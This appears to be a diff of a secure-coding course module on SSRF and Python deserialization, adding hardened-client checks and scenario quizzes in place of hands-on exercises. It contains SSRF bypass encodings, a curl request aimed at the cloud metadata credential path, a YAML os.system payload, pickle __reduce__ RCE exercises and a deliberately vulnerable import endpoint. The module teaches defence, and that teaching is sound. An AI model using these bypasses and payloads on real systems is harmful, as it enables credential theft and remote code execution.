-| resolve + `ipaddress` check | block internal/metadata targets | `ip.is_private/is_loopback/is_link_local` |
-| `follow_redirects=False` | stop redirect-to-internal | `httpx.AsyncClient(follow_redirects=False)` |
-| scheme allowlist | kill `file:`/`gopher:` | accept only `http`/`https` |
-| network egress rules / IMDSv2 | backstop below the code | block `169.254.169.254` at the network |
-| `json.loads` + Pydantic | safe deserialization + shape check | data-only format, validated |
-| `yaml.safe_load` | safe YAML | never `yaml.load`/FullLoader on untrusted |
-| **never** `pickle.loads(untrusted)` | avoid RCE | pickle only within your trust zone |
-| HMAC-sign serialized bytes | if rich format unavoidable | verify constant-time before loading |
-
-A hardened URL-fetching endpoint — the SSRF half in one snippet:
-
-```python
-import httpx, ipaddress, socket
-from urllib.parse import urlparse
-from fastapi import APIRouter, HTTPException
-
-router = APIRouter()
-ALLOWED_HOSTS = {"api.partner.com", "cdn.partner.com"}   # allowlist first if you can
-
-@router.post("/fetch-preview")
-async def fetch_preview(url: str):
-    p = urlparse(url)
-    if p.scheme not in ("http", "https"):
-        raise HTTPException(400, "bad scheme")
-    if p.hostname not in ALLOWED_HOSTS:                  # strongest control
-        raise HTTPException(400, "host not allowed")
-    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))   # and re-validate the IP
-    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
-        raise HTTPException(400, "target not public")
-    async with httpx.AsyncClient(follow_redirects=False, timeout=5) as client:
-        r = await client.get(url)          # redirects off so it can't bounce inward
-    return {"len": len(r.text)}
+**Expected Wire Output (Hardened Safe Client):**
+```json
+{
+  "error": "SSRFValidationError",
+  "detail": "Target resolves to a private, loopback, or reserved IP address"
+}
 ```
 
-## Hands-on exercises
+---
 
-Continue in `sec-track`. For the metadata exercise you don't need a real cloud
-account — run a tiny local server on `169.254.169.254`-stand-in (use
-`127.0.0.1:9000` serving a fake "credentials" JSON) to represent the internal
-target, and point the SSRF at it.
+### Step 2: Test AWS Metadata Access (Simulated IMDS)
 
-### 1. Build the vulnerable fetcher and hit an internal target
-
-Write the `/fetch-preview?url=` endpoint that does `httpx.get(url)` with no
-checks. Stand up a second local server (a fake "internal admin" on
-`127.0.0.1:9000` returning `SECRET-INTERNAL-DATA`). From the public endpoint,
-pass `url=http://127.0.0.1:9000/`. Expected: your public endpoint returns the
-internal server's secret — you've proven SSRF reaches inside.
-
-### 2. Simulate the metadata-credentials theft
-
-Point your fake internal server at a `/latest/meta-data/iam/...` path returning
-a JSON blob of fake "credentials." Fetch it through the SSRF endpoint. Expected:
-the "IAM credentials" come back through your public API — this is, mechanically,
-the Capital One breach. Write one sentence on why the metadata endpoint is so
-catastrophic a target.
-
-### 3. Break a naive blocklist
-
-Add a "fix" that rejects `url` containing `127.0.0.1` or `localhost`. Now bypass
-it: try `http://0x7f000001/`, `http://2130706433/`, `http://127.1/`, or a
-hostname you control (via `/etc/hosts` or a `*.localtest.me`-style name) that
-resolves to `127.0.0.1`. Expected: at least one bypass reaches the internal
-target anyway — proving blocklists don't fix SSRF.
-
-### 4. Fix it properly: resolve, validate, pin
-
-Replace the blocklist with: scheme allowlist, resolve the hostname to an IP
-yourself, reject `is_private/is_loopback/is_link_local/is_reserved`, and (bonus)
-connect to the resolved IP. Replay every bypass from exercise 3. Expected: all
-of them are rejected because they *resolve* to non-public addresses regardless
-of how the input was encoded.
-
-### 5. Defeat the redirect bypass
-
-With your validated fetcher, set up a *public-looking* URL (a local server on a
-non-loopback interface, or mock it) that returns `302 Location:
-http://127.0.0.1:9000/`. Fetch it with `follow_redirects=True`. Expected: you
-land on the internal target despite the initial URL passing validation. Fix with
-`follow_redirects=False` (or re-validate each hop) and confirm.
-
-### 6. Pickle RCE against yourself
-
-Write the `Exploit.__reduce__` class from Concepts (have it create a file
-`/tmp/pwned` or print a banner rather than anything harmful), `pickle.dumps` it,
-and `pickle.loads` the bytes. Expected: your "innocent" `loads` runs the
-payload. Internalize that this requires *no* bug in your logic — `loads` itself
-is the vulnerability.
-
-### 7. Find the pickle hiding in a cache
-
-Build a cache helper that stores/loads values with `pickle` in Redis (or a
-dict). Now imagine an attacker who can write one cache key (via some other bug):
-write a pickled `Exploit` to that key and call your cache `get`. Expected: RCE on
-read. Then switch the cache serializer to `json` and confirm the same poisoned
-value is now inert (worst case: a bad dict, which you validate).
-
-### 8. YAML config loader: `load` vs `safe_load`
-
-Load a config file with `yaml.load(..., Loader=yaml.FullLoader)` (or bare
-`yaml.load` on an old version) and feed it a `!!python/object/apply:os.system`
-payload. Observe (or reason precisely about) the code execution. Switch to
-`yaml.safe_load` and confirm the payload is rejected/inert. Expected: you can
-state exactly why `safe_load` is mandatory for any config a user can influence.
-
-### 9. Diagnose and fix: the import-from-URL feature
-
-Audit this "import your data from a URL, we cache the parsed result" endpoint for
-*both* an SSRF and a deserialization flaw, and fix both.
-
-```python
-import httpx, pickle
-@app.post("/import")
-async def import_data(source_url: str):
-    async with httpx.AsyncClient() as c:
-        raw = (await c.get(source_url)).content        # fetches any URL, follows redirects
-    obj = pickle.loads(raw)                            # trusts remote bytes
-    redis.set(f"import:{source_url}", pickle.dumps(obj))
-    return {"imported": len(obj)}
+```bash
+# 2. Attempt direct metadata credential extraction
+curl -s -X POST "http://localhost:8080/api/v1/preview" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' | jq .
 ```
 
+**Expected Output (Hardened Safe Client):**
+```json
+{
+  "error": "SSRFValidationError",
+  "detail": "Target resolves to a private, loopback, or reserved IP address"
+}
+```
+
+---
+
+## 6. Operational Validation Checkpoints (Scenario Quizzes)
+
+### Checkpoint 1: DNS Rebinding Mechanics
 <details>
-<summary>Solution</summary>
+<summary><strong>Scenario Assessment:</strong> You inspect an open-source webhook library that checks user URLs with <code>if is_private(socket.gethostbyname(url.host)): raise Error()</code> and then calls <code>requests.get(url)</code>. What vulnerability exists, and how can an attacker bypass the check?</summary>
 
-Two critical flaws. (1) **SSRF** — `source_url` is fetched with no validation and
-default redirect-following, so it reaches internal services / `169.254.169.254`.
-Fix: allowlist hosts if possible; otherwise scheme-check, resolve + reject
-private/loopback/link-local/reserved IPs, `follow_redirects=False`, and back it
-with network egress rules. (2) **Insecure deserialization / pickle RCE** —
-`pickle.loads(raw)` on *remote* bytes is direct remote code execution; the
-attacker serves a crafted pickle and owns your server. Fix: transport a data-only
-format (`json.loads`) and validate the shape with Pydantic; never `pickle` across
-a trust boundary. (Bonus: the endpoint then re-`pickle`s into Redis — a second
-pickle-in-cache hazard; store JSON there too so a poisoned cache value can't RCE
-readers.) Corrected shape: validate+pin the URL, fetch with redirects off, parse
-as JSON, validate the object, cache as JSON.
+```
+Options:
+A) The library will fail because `requests` does not support HTTPS over port 443.
+B) DNS Rebinding (TOCTOU); the attacker controls their authoritative DNS server to reply with a public IP on the first resolution, but responds with `169.254.169.254` when `requests.get()` re-resolves the domain.
+C) Path traversal; the URL path can escape into `/etc/passwd`.
+D) XSS; the response will execute JavaScript inside the Python runtime.
+```
+
+**Answer:**
+**B is correct.** This is a classic Time-of-Check to Time-of-Use (**TOCTOU**) bug. The validation phase and the execution phase perform two separate DNS resolutions. An attacker with a custom DNS server sets the Time-to-Live (TTL) to 1 second; the first query returns a valid public IP (passing the `is_private` check), but the second query (executed by `requests.get`) returns `169.254.169.254`, bypassing the control completely. The remedy is **Socket Pinning**: resolve once, validate, and connect directly to the resolved IP.
 
 </details>
 
-## Independent challenge
+---
 
-No code given. Build a "website screenshot / link-preview" service for
-`sec-track`: the user submits a URL, your server fetches it, extracts the title
-and a data-only summary, and caches the result. Make it **SSRF-proof** — decide
-whether an allowlist is possible for your use case (justify it) and, if you must
-accept arbitrary public URLs, implement resolve-validate-(pin) with redirects
-disabled and a scheme allowlist, plus describe the network-layer egress backstop
-you'd add in production. Then make the **caching layer deserialization-safe**:
-store and reload the cached summary in a format that cannot execute code, and
-validate its shape on load (reach back to **module 01**'s "a dict is not proof of
-the right dict" and Pydantic typing). Finally, write a threat-model note (module
-00's lens) covering: what internal targets your unprotected version could have
-reached, why a blocklist would not have sufficed, and why `pickle` in the cache
-would have been an RCE even though "the data is our own."
-
+### Checkpoint 2: The Fallacy of In-Memory Pickle Caching
 <details>
-<summary>Hint</summary>
+<summary><strong>Scenario Assessment:</strong> A developer builds a Redis caching decorator in Python: <code>redis.set(key, pickle.dumps(data))</code> and <code>pickle.loads(redis.get(key))</code>. The developer states: "This data is created exclusively by our backend, so pickle is completely safe." Why is this an architectural security hazard?</summary>
 
-The subtlety that separates a real SSRF fix from a fake one is the **gap between
-validation and use**: if you check the hostname's IP and *then* let the HTTP
-client re-resolve the name to connect, DNS rebinding slips a public IP past your
-check and an internal IP into the actual socket (a TOCTOU bug). Closing it means
-resolving once and connecting to *that* IP, and disabling redirects so a
-validated URL can't `302` you inward. For the cache, the trap in "the data is
-our own" is that a *separate* vulnerability (a cache-write bug, a poisoned
-upstream) can plant bytes another code path will `pickle.loads` — so the RCE
-doesn't need the attacker to control the pickle directly, only to influence what
-lands in a store you later deserialize. JSON removes the primitive entirely:
-worst case is a malformed dict, which Pydantic rejects.
+```
+Options:
+A) Redis cannot store bytes larger than 128 bytes without data corruption.
+B) If any secondary vulnerability permits an attacker to write or overwrite a single key in Redis, loading that key grants the attacker immediate Remote Code Execution (RCE) on the web server.
+C) Pickle requires root operating system permissions to deserialize numbers.
+D) The Python garbage collector crashes when deserializing dictionaries.
+```
+
+**Answer:**
+**B is correct.** While the application intends to write its own data, treating the cache as a trusted boundary is dangerous. If an attacker discovers a Redis SSRF vulnerability, an injection into a cache key, or accesses a shared Redis cluster, they can overwrite a key with a serialized payload containing an `Exploit.__reduce__()` hook. When the backend retrieves and calls `pickle.loads()`, the payload executes arbitrary shell commands on the server. Always use data-only formats (JSON, Protobuf) across external caches.
 
 </details>
 
-## Common mistakes & troubleshooting
+---
 
-- **Fetching a user-supplied URL with no validation.** Classic SSRF — reaches
-  internal services and cloud metadata. Allowlist hosts; else resolve+validate
-  the IP and disable redirects.
-- **Blocklisting `localhost`/`127.0.0.1`/`169.254...`.** Bypassable via decimal/
-  hex/short IP encodings, DNS names, and rebinding. Allowlist or resolve-and-
-  validate against private/loopback/link-local/reserved.
-- **Leaving redirects enabled on the fetcher.** A validated public URL can `302`
-  to an internal one. `follow_redirects=False` (or re-validate every hop).
-- **Relying on the code check alone.** Add the network backstop (egress firewall,
-  IMDSv2) so a bypass still can't reach the metadata IP.
-- **`pickle.loads` on anything untrusted.** It's remote code execution by design
-  — including via caches (Redis/Memcached), Celery, sessions, and ML model
-  files. Use JSON across trust boundaries; pickle only within your process.
-- **`yaml.load` / FullLoader on user-influenced config.** Can construct
-  arbitrary objects (RCE). Always `yaml.safe_load`.
-- **`eval`/`exec` on request input.** RCE by definition. Use `json.loads` /
-  `ast.literal_eval`, never `eval`.
-- **Assuming JSON is safe *shape*.** JSON can't execute code, but a valid-JSON
-  hostile *shape* still needs Pydantic validation (module 01's NoSQL lesson).
-
-## Checkpoint quiz
-
-Write down your answer to each question before expanding it — checking without attempting first is the single easiest way to fool yourself into thinking you've learned this.
-
-1. What is SSRF, and why is "my server fetches a URL" so much more dangerous than
-   "the user's browser fetches a URL"?
-2. Name three things an attacker targets via SSRF and why the cloud metadata
-   endpoint is the worst.
-3. Why doesn't a blocklist of `localhost`/`127.0.0.1`/`169.254.169.254` fix
-   SSRF? Give two bypasses and the defense that actually works.
-4. What is DNS rebinding, and what property must a correct SSRF fix have to stop
-   it?
-5. Why is `pickle.loads` on untrusted data a remote-code-execution
-   vulnerability, not merely a data bug? Name two non-obvious places pickle
-   hides.
-6. Why is JSON a safe deserialization format where pickle is not, and what must
-   you still do after `json.loads`?
-7. What's the difference between `yaml.load` and `yaml.safe_load`, and which do
-   you use for user-influenced input?
-
+### Checkpoint 3: Stopping HTTP 302 Redirect Bypasses
 <details>
-<summary>Answers</summary>
+<summary><strong>Scenario Assessment:</strong> Your image proxy validates that user URLs point strictly to public IPs. An attacker registers <code>https://public-cdn.attacker.com/avatar.png</code>, which passes validation. However, that server responds with <code>HTTP/1.1 302 Found</code> and <code>Location: http://10.0.1.20:8000/admin</code>. What must the HTTP client do to stop this?</summary>
 
-1. SSRF is when your server makes an HTTP request to a URL an attacker
-   controls. It's dangerous because your server sits *inside* your network with
-   an identity/position the attacker's own machine lacks — so the attacker's URL
-   is fetched *from the server's trusted vantage point*, reaching internal
-   services and credentials the outside world can't touch.
-2. Internal services (unauthenticated admin panels, Redis, internal APIs), the
-   cloud metadata endpoint (`169.254.169.254`), and other schemes/hosts
-   (`file://`, internal IPs). Metadata is worst because it hands out temporary
-   IAM credentials to anything on the instance — SSRF to it steals your cloud
-   keys (the Capital One breach).
-3. The input space is larger than any blocklist: `127.0.0.1` can be written
-   `2130706433`, `0x7f000001`, `127.1`; or a DNS name can resolve to an internal
-   IP; or a redirect bounces you inward. The fix: allowlist hosts, or resolve the
-   name yourself and reject private/loopback/link-local/reserved IPs, with
-   redirects disabled.
-4. DNS rebinding: the hostname resolves to a public IP when you *check* it, then
-   re-resolves to an internal IP when the client actually *connects* (a
-   time-of-check/time-of-use gap). The fix must resolve once and connect to that
-   *same validated IP* (pin it), not let the client re-resolve.
-5. Because the pickle format includes opcodes that *call* callables while
-   rebuilding an object (`__reduce__` can name any callable), so loading
-   attacker bytes executes attacker code — RCE, by design, not a bug. Hidden
-   spots: pickle-serialized caches (Redis/Memcached), Celery's pickle
-   serializer, session stores, and ML model files (`torch.load`/`joblib`/
-   `read_pickle`).
-6. JSON is a data-only format — it can only produce strings/numbers/lists/dicts
-   and has no mechanism to call code on load — so the worst hostile JSON does is
-   yield a bad-shaped dict. After `json.loads` you must still *validate the
-   shape/types* (Pydantic), because valid JSON is not proof of the expected
-   structure.
-7. `yaml.load` (default/FullLoader) can construct arbitrary Python objects
-   (`!!python/object/apply:...`) — an RCE path like pickle; `yaml.safe_load`
-   restricts to basic types. Always use `safe_load` for any user-influenced
-   input.
+```
+Options:
+A) Enable gzip compression on incoming HTTP response streams.
+B) Set the client to disable automatic redirect following (`follow_redirects=False`), or re-run the complete IP validation and socket pinning process on every redirected hop.
+C) Encrypt all HTTP request bodies with AES-CBC.
+D) Disallow all HTTPS URLs.
+```
+
+**Answer:**
+**B is correct.** When an HTTP client automatically follows redirects, the subsequent request to the `Location` target is initiated without re-running the initial URL validation checks. The client will happily follow the redirect inward to the private RFC 1918 internal IP address. Setting `follow_redirects=False` or configuring a redirect hook that re-evaluates the destination IP prevents redirect bouncing.
 
 </details>
 
-## Further reading & sources
+---
 
-- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) - allowlisting, resolve-then-validate, and why blocklists fail.
-- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) - safe formats and integrity checks for serialized data across languages.
-- [Python `pickle` docs - security warning](https://docs.python.org/3/library/pickle.html#module-pickle) - the official "never unpickle untrusted data" warning and why.
-- [Python `ipaddress` module](https://docs.python.org/3/library/ipaddress.html) - the `is_private`/`is_loopback`/`is_link_local`/`is_reserved` checks used to validate resolved IPs.
-- [AWS - Use IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) - the token-required metadata service that blocks the simplest SSRF-to-credentials path.
-- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html) - the formal weakness definition (see CWE-502 for deserialization).
+## 7. Further Reading & Sources
 
-## Next
+- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
+- [AWS Security: Transitioning to IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)
+- [Python Official Documentation: Warning on Pickle Security](https://docs.python.org/3/library/pickle.html)
+- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
 
-[04-rate-limiting-and-abuse-prevention](../04-rate-limiting-and-abuse-prevention/README.md)
-— from single-request attacks to *volume* attacks. Rate limiting is the control
-that stands between an attacker and unlimited attempts: brute force, credential
-stuffing, scraping, and resource exhaustion. You'll implement token-bucket and
-sliding-window limiters backed by Redis.
+---
+
+## Next Steps
+
+Now that outbound network fetches and serialization layers are fortified, we transition from single-request vulnerabilities to **volumetric attacks and abuse prevention**:
+
+- Next Module: **[04-rate-limiting-and-abuse-prevention](../04-rate-limiting-and-abuse-prevention/README.md)** (Token Bucket, Sliding Window Counter, Distributed Redis Leaky Bucket, and Credential Stuffing Defense).
+- Track Index: [README.md](../README.md)
